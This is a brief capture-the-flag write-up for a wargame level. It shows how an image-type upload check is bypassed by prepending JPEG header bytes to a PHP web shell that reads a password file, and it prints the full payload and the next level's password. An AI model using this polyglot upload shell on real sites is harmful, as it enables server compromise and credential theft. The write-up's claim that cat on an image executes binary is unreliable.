This lab had the same setup as the last one but it warns you that it now checks
if you actually uploaded an image. If you examine the code you'll see that it
does this solely with the exif_imagetype() function from the php standard
library. It does this by examining signatures at the beginning of a file. I read
that these signatures had hex values ffd8. I couldn't get this to work.

For my solution I just copied several lines from a real .jpeg image and pasted
it at the top of my php script. To do this I viewed the image in text mode using
emacs. I would not recommend using cat or head on an image file because this
will cause binary to be executed on your computer. After putting this text at
the top of my php file (before the <?php) I followed the same steps as I did for
natas12.

My php script looked like this:

ÿØÿà\0JFIF\0\0\0\0\0\0ÿÛ\0„\0	4!%-6&&57.1/ 383,7(-.+
<?php

echo "<br>".shell_exec("cat /etc/natas_webpass/natas14");

?>

I added a break tag to visually separate the password text from the junk binary.

natas14 password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
